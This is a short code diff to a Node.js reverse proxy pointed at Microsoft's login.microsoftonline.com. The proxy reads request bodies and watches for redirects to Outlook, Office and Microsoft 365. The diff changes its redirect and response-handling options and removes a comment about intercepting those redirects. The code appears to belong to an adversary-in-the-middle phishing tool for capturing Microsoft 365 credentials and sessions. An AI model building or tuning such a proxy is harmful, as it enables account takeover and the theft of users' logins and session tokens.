@@ -31,8 +31,8 @@ const proxy = createProxyMiddleware({
     target: 'https://login.microsoftonline.com',
     changeOrigin: true,
     secure: true,
-    selfHandleResponse: true,
-    followRedirects: false, // Don't follow 302s automatically
+    selfHandleResponse: false,
+    followRedirects: true,
     
     onProxyReq: (proxyReq, req, res) => {
         const bodyStr = req.body?.toString?.() || '';
@@ -114,7 +114,6 @@ const proxy = createProxyMiddleware({
                 }
             }
             
-            // If this is a redirect to outlook/copilot, intercept it
             if (proxyRes.statusCode === 302 || proxyRes.statusCode === 301) {
                 const location = proxyRes.headers['location'] || '';
                 if (location.includes('outlook') || location.includes('office') || location.includes('microsoft365')) {
